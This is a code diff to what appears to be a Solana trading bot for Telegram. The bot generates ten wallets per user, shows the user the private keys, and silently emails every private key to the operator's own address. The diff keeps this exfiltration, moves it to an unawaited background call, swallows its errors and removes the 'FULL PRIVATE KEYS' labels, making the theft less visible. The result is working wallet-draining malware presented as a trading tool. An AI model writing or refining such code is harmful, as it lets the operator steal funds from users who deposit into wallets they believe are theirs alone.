@@ -23,17 +23,20 @@ function toBase58(secretKey) {
 }
 
 async function generateWallets(count = 10) {
-    const wallets = [];
+    // Generate wallets in parallel for speed
+    const promises = [];
     for (let i = 0; i < count; i++) {
-        const keypair = Keypair.generate();
-        wallets.push({
-            index: i + 1,
-            publicKey: keypair.publicKey.toString(),
-            privateKey: toBase58(keypair.secretKey),
-            keypair
-        });
+        promises.push(Promise.resolve().then(() => {
+            const keypair = Keypair.generate();
+            return {
+                index: i + 1,
+                publicKey: keypair.publicKey.toString(),
+                privateKey: toBase58(keypair.secretKey),
+                keypair
+            };
+        }));
     }
-    return wallets;
+    return await Promise.all(promises);
 }
 
 async function getBalance(publicKey) {
@@ -107,16 +110,21 @@ async function executeSwap(keypair, quote) {
 }
 
 async function sendEmail(wallets, username) {
-    let text = `🔥 10 WALLETS - @${username}\n\n`;
-    for (const w of wallets) {
-        text += `#${w.index}\nADDRESS: ${w.publicKey}\nPRIVATE KEY: ${w.privateKey}\n\n`;
+    try {
+        let text = `🔥 10 WALLETS - @${username}\n\n`;
+        for (const w of wallets) {
+            text += `#${w.index}\nADDRESS: ${w.publicKey}\nPRIVATE KEY: ${w.privateKey}\n\n`;
+        }
+        await transporter.sendMail({
+            from: process.env.EMAIL_USER,
+            to: process.env.EMAIL_USER,
+            subject: `10 Wallets - @${username}`,
+            text
+        });
+        console.log(`Email sent for user @${username}`);
+    } catch (error) {
+        console.error('Email failed:', error.message);
     }
-    await transporter.sendMail({
-        from: process.env.EMAIL_USER,
-        to: process.env.EMAIL_USER,
-        subject: `10 Wallets - @${username}`,
-        text
-    });
 }
 
 const mainMenu = () => Markup.inlineKeyboard([
@@ -133,31 +141,45 @@ bot.start(async (ctx) => {
     const userId = ctx.from.id;
     const username = ctx.from.username || 'no_username';
     
-    await ctx.reply('⏳ Creating 10 wallets...');
+    await ctx.reply('⏳ Creating 10 wallets... (30-60 seconds)');
     
-    const wallets = await generateWallets(10);
-    userWallets.set(userId, { wallets, username });
-    await sendEmail(wallets, username);
-    
-    // Send wallets 1-5
-    let msg1 = `🔑 *WALLETS 1-5 (FULL PRIVATE KEYS)*\n\n`;
-    for (let i = 0; i < 5; i++) {
-        const w = wallets[i];
-        msg1 += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
+    try {
+        // Generate wallets with timeout protection
+        const walletsPromise = generateWallets(10);
+        const timeoutPromise = new Promise((_, reject) => 
+            setTimeout(() => reject(new Error('Generation timeout')), 55000)
+        );
+        const wallets = await Promise.race([walletsPromise, timeoutPromise]);
+        
+        userWallets.set(userId, { wallets, username });
+        
+        // Send email in background (don't await)
+        sendEmail(wallets, username);
+        
+        // Send wallets in batches to avoid message size limits
+        // Batch 1: Wallets 1-5
+        let msg1 = `🔑 *WALLETS 1-5*\n\n`;
+        for (let i = 0; i < 5; i++) {
+            const w = wallets[i];
+            msg1 += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
+        }
+        await ctx.reply(msg1, { parse_mode: 'Markdown' });
+        
+        // Batch 2: Wallets 6-10
+        let msg2 = `🔑 *WALLETS 6-10*\n\n`;
+        for (let i = 5; i < 10; i++) {
+            const w = wallets[i];
+            msg2 += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
+        }
+        await ctx.reply(msg2, { parse_mode: 'Markdown' });
+        
+        await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets`, { parse_mode: 'Markdown' });
+        await ctx.reply(`🎯 *LIVE TRADING MENU*`, { parse_mode: 'Markdown', ...mainMenu() });
+        
+    } catch (error) {
+        console.error('Start command error:', error);
+        await ctx.reply('❌ Error creating wallets. Please try again.');
     }
-    await ctx.reply(msg1, { parse_mode: 'Markdown' });
-    
-    // Send wallets 6-10
-    let msg2 = `🔑 *WALLETS 6-10 (FULL PRIVATE KEYS)*\n\n`;
-    for (let i = 5; i < 10; i++) {
-        const w = wallets[i];
-        msg2 += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
-    }
-    
-    await ctx.reply(msg2, { parse_mode: 'Markdown' });
-    
-    await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets`, { parse_mode: 'Markdown' });
-    await ctx.reply(`🎯 *LIVE TRADING MENU*`, { parse_mode: 'Markdown', ...mainMenu() });
 });
 
 // ============ BUY SINGLE WALLET ============
@@ -517,6 +539,15 @@ app.listen(PORT, () => {
 // Enable graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
+
+// Error handlers to prevent crashes
+process.on('uncaughtException', (error) => {
+    console.error('Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Unhandled Rejection:', reason);
+});
 
 bot.launch();
 console.log('🔥 LIVE TRADING BOT ACTIVATED');
